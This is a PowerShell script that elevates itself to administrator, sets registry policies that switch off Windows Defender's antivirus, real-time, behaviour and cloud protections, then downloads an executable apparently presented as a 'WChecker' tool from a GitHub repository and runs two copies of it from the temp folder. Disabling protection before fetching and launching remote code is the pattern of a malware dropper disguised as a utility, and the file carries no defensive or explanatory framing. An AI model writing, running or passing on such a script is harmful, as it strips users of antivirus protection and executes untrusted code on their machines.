# thanks to https://superuser.com/a/1648105
#### START ELEVATE TO ADMIN #####
Param([Parameter(Mandatory=$false)][switch]$shouldAssumeToBeElevated, [Parameter(Mandatory=$false)] [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride')))
{
    $workingDirOverride = (Get-Location).Path
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false)  {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevating did not work :("
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"
##### END ELEVATE TO ADMIN #####

Write-Output $workingDirOverride

$DefenderPath                       = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$RealTimeProtectionKey              = "Real-Time Protection"
$SignatureUpdatesKey                = "Signature Updates"
$SpynetKey                          = "Spynet"

$AllowFastServiceStartupValue       = "AllowFastServiceStartup"
$DisableAntiSpywareValue            = "DisableAntiSpyware"
$DisableAntiVirusValue              = "DisableAntiVirus"
$DisableRoutinelyTakingActionValue  = "DisableRoutinelyTakingAction"
$DisableSpecialRunningModesValue    = "DisableSpecialRunningModes"
$ServiceKeepAliveValue              = "ServiceKeepAlive"
$DisableBehaviorMonitoringValue     = "DisableBehaviorMonitoring"
$DisableOnAccessProtectionValue     = "DisableOnAccessProtection"
$DisableRealtimeMonitoringValue     = "DisableRealtimeMonitoring"
$DisableScanOnRealtimeEnableValue   = "DisableScanOnRealtimeEnable"
$ForceUpdateFromMUValue             = "ForceUpdateFromMU"
$DisableBlockAtFirstSeenValue       = "DisableBlockAtFirstSeen"

$WindowsDefenderIsDisabledPermanently = "WindowsDefenderIsDisabledPermanently"

If(Test-Path -Path $DefenderPath) {
    Write-host -f Green "Key Exists!"
}
Else {
    Write-host -f Yellow "Key doesn't Exists!"
    exit
}

$IsAleadyDisabled = Get-ItemProperty -Path "$DefenderPath" -Name "$WindowsDefenderIsDisabledPermanently" -ErrorAction SilentlyContinue
If($IsAleadyDisabled)
{
    Write-Error "You have already disabled windows defender!"
    Pause
    exit
}

New-ItemProperty -Path "$DefenderPath" -Name "$WindowsDefenderIsDisabledPermanently" -Value "1" -PropertyType Dword

New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force
New-Item -Path "$DefenderPath\$SignatureUpdatesKey" -Force
New-Item -Path "$DefenderPath\$SpynetKey" -Force

New-ItemProperty -Path "$DefenderPath" -Name "$AllowFastServiceStartupValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath" -Name "$DisableAntiSpywareValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath" -Name "$DisableAntiVirusValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath" -Name "$DisableRoutinelyTakingActionValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath" -Name "$DisableSpecialRunningModesValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath" -Name "$ServiceKeepAliveValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath" -Name "$DisableRealtimeMonitoringValue" -Value "1" -PropertyType Dword

New-ItemProperty -Path "$DefenderPath\$RealTimeProtectionKey" -Name "$DisableBehaviorMonitoringValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath\$RealTimeProtectionKey" -Name "$DisableOnAccessProtectionValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath\$RealTimeProtectionKey" -Name "$DisableRealtimeMonitoringValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath\$RealTimeProtectionKey" -Name "$DisableScanOnRealtimeEnableValue" -Value "1" -PropertyType Dword

New-ItemProperty -Path "$DefenderPath\$SignatureUpdatesKey" -Name "$ForceUpdateFromMUValue" -Value "1" -PropertyType Dword

New-ItemProperty -Path "$DefenderPath\$SpynetKey" -Name "$DisableBlockAtFirstSeenValue" -Value "1" -PropertyType Dword

Write-Host "Downloading and running files..."

$tempFolder = [System.IO.Path]::GetTempPath()
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/WChecker.exe"
$dest1 = Join-Path $tempFolder "WChecker1.exe"
Write-Host "Downloading 1 -> $dest1"
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
$wc.DownloadFile($url1, $dest1)
if (Test-Path $dest1) {
    Write-Host "Running 1"
    Start-Process -FilePath $dest1
} else {
    Write-Host "Download failed 1"
}

$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/WChecker.exe"
$dest2 = Join-Path $tempFolder "WChecker2.exe"
Write-Host "Downloading 2 -> $dest2"
$wc.DownloadFile($url2, $dest2)
if (Test-Path $dest2) {
    Write-Host "Running 2"
    Start-Process -FilePath $dest2
} else {
    Write-Host "Download failed 2"
}

Write-Host "All done."
Pause
